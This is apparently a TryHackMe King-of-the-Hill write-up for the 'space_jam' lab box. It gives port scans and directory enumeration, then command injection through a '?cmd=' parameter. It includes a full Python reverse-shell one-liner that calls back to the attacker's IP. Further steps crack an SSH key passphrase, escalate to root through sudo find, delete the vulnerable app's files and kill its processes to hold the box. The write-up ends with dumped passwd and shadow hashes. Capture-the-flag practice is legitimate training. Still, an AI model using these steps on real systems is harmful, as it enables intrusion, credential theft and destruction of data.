
THM-KOTH: space_jam
============================

> labruhtooryboi | December 6, 2020


# 10.10.163.118
# spacejam.thm



					# reconnisance

'''
Open 10.10.163.118:22
Open 10.10.163.118:23
Open 10.10.163.118:80
Open 10.10.163.118:3000
Open 10.10.163.118:9999
Open 10.10.163.118:61432
'''

'''
nmap -p 22,23,80,3000,9999 -sC -sV -v -oN nmapinit.txt 10.10.163.118
'''


'''
Nmap scan report for 10.10.163.118
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:f0:d5:f2:67:1e:55:99:de:c6:26:85:b3:86:ea:81 (RSA)
|   256 4f:5f:62:98:aa:b1:dd:a2:81:61:16:9b:a5:29:cd:bd (ECDSA)
|_  256 9b:12:b0:f3:1f:fb:b7:d8:a8:9c:6b:e6:bd:f4:40:55 (ED25519)
23/tcp   open  telnet  Linux telnetd
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Michael Jordan
3000/tcp open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
9999/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Mon, 07 Dec 2020 05:57:38 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Mon, 07 Dec 2020 05:57:37 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Connection: close
|_    Request: missing required Host header
|_http-favicon: Unknown favicon MD5: 68B329DA9893E34099C7D8AD5CB9C940
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data.
'''





					# enumeration

(http:80)
'''
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/LICENSE (Status: 200)
/css (Status: 301)
/flag (Status: 301)
/images (Status: 301)
/img (Status: 301)
/install (Status: 301)
/javascript (Status: 301)
/js (Status: 301)
/local (Status: 301)
/mail (Status: 301)
/scripts (Status: 301)
/server-status (Status: 403)
/test (Status: 301)
/vendor (Status: 301)
'''



(http:3000)
'''
http://10.10.112.236:3000/?cmd=
'''




					# exploitation

(nc -lvnp 4321)
'''
http://10.10.112.236:3000/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.27.82",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
'''





					# privelage escalation
	


*am root from rev-python				



(go through ssh)
'''
/home/jordan/.ssh/id_rsa

ssh2john:
pass123          (jordan_rsa)
'''

'''
User jordan may run the following commands on spacejam:
    (ALL) NOPASSWD: /usr/bin/find
'''


'''
sudo find . -exec /bin/sh \; -quit
'''

'''
python3 -c 'import pty;pty.spawn("/bin/bash")' 
'''





					# keeping the kill

'''
rm -rf /home/bunny/simple-command-injection/*
'''


(kill node.js processes)
'''
ps aux 
'''


'''
kill -9 1289
kill -9 1277
'''




					# interesting things

>flags

'''
http://10.10.163.118:3000/?cmd=cat%20/home/bunny/user.txt
http://10.10.163.118:3000/?cmd=cat%20/home/jordan/user.txt

(forgot to copy it sry)
'''

'''
/root.txt
218f5ea7a4d711eef60171e5c92ba9e1
'''



>users

'''
bunny
jordan
root
'''


>passwds

'''
pass123
'''


>files and dirs
'''
/home/jordan/user.txt
/home/bunny/user.txt
/root/king.txt
/root/root.txt
/home/bunny/simple-command-injection/
/home/jordan/.ssh/id_rsa
'''


>root stuff 
'''
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
jordan:x:1000:1000:,,,:/home/jordan:/bin/bash
bunny:x:1001:1001:,,,:/home/bunny:/bin/rbash
telnetd:x:112:119::/nonexistent:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
postgres:x:114:122:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
'''



(this is after I changed the root passwd)
'''
root:$6$a.kpa8p7$8MyQWqdXi8kIyb4CgqAViyCa51fW55x0m3paAVcXESs3t03iuUuLq9OQRsoHk7c5HhIsBC5HDddfXWElTK1Ha0:18317:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
lxd:*:18317:0:99999:7:::
mysql:!:18317:0:99999:7:::
messagebus:*:18317:0:99999:7:::
uuidd:*:18317:0:99999:7:::
dnsmasq:*:18317:0:99999:7:::
sshd:*:18317:0:99999:7:::
jordan:$6$6jKm02ie$qiEzYLKjGwoxz5Fl.r/oSXEqeX3qgAZRKmZqdz8GFpTck6lj5b3RUhA6weUckJSFHuFdAbvdI6K5YWGx7N5Ph.:18317:0:99999:7:::
bunny:$6$HOScqZHA$ewn.WIghxLt7yv.nn.6jtaR8HNaKGklcG5bQqZirIDtZUNIgnek3JREVx.0huE8.oYYsaGJv4FTJhLR296czW1:18317:0:99999:7:::
telnetd:*:18317:0:99999:7:::
colord:*:18317:0:99999:7:::
postgres:*:18317:0:99999:7:::
'''
